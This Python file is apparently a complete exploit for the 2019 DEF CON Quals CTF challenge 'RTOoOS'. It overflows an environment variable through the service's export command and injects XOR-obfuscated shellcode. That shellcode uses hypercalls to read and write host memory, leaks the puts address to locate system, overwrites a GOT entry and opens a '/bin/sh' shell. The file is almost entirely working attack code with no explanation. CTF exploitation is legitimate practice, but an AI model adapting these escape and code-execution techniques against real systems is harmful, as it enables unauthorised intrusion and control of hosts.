#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

mode = 'SOCKET'
target  = {'host':'rtooos.quals2019.oooverflow.io', 'port':5000}

#==========

offset_got_puts     = 0x00002130
offset_vm_mem       = 0x0008e000

offset_system_c_puts            = 0x00041184
offset_system_c_system          = 0x00062cf9

#==========

def attack(conn, **kwargs):
    os = RTO(conn)

    os.export('0', '0'*0x1f0+'\x80')
    for i in range(1, 6):
        os.export(str(i), str(i)*0x1f0)

    os.export('5', 'a'*0x192+'$0')

    shellasm  = read_mem(-offset_vm_mem+offset_got_puts)
    shellasm += write_mem(-offset_vm_mem+offset_got_puts, 8)
    shellasm += write_mem(0x3000, 8)
    shellasm += read_mem(0x3000)
    shellasm += 'ret'
    shellcode = asm(shellasm)

    os.export('0', asm(write_mem(0x80 + 0x2b, len(shellcode))))
    conn.sendlineafter('[RTOoOS> ', 'ls')
    conn.send(shellcode)

    addr_system_c_puts      = u(conn.recvuntil('\n', drop=True))
    addr_system_c_base      = addr_system_c_puts - offset_system_c_puts
    addr_system_c_system    = addr_system_c_base + offset_system_c_system
    info('addr_system_c_base    = 0x{:08x}'.format(addr_system_c_base))

    conn.send(p64(addr_system_c_system))
    conn.send('/bin/sh\x00')

def write_mem(offset, size):
    shellasm  = '''
    mov rbx, 0x0101010101010101
    mov rax, {offset}
    xor rax, rbx
    mov rsi, {size}
    xor rsi, rbx
    xor rdi, rdi
    mov dil, 0x63
    out dx, al
    '''.format(offset=offset^0x0101010101010101, size=size^0x0101010101010101)
    return shellasm
  
def read_mem(offset):
    shellasm  = '''
    mov rax, 0x0101010101010101
    mov rbx, {offset}
    xor rax, rbx
    xor rdi, rdi
    mov dil, 0x64
    out dx, al
    '''.format(offset=offset^0x0101010101010101)
    return shellasm

def read_file(fname):
    shellasm  = '''
    xor rdi, rdi
    lea rax, [rip+fname]
    mov byte ptr [rip+fname+{}], dil
    mov dil, 0x66
    out dx, al
fname:
    .string "{}"
    '''.format(len(fname), fname)
    return shellasm

class RTO:
    def __init__(self, conn):
        self.conn           = conn
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def export(self, name, data):
        self.sendlineafter('[RTOoOS> ', 'export {}={}'.format(name, data))

    def env(self):
        self.sendlineafter('[RTOoOS> ', 'env')
 
#==========

if __name__=='__main__':
    comn = Communicate(mode, **target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
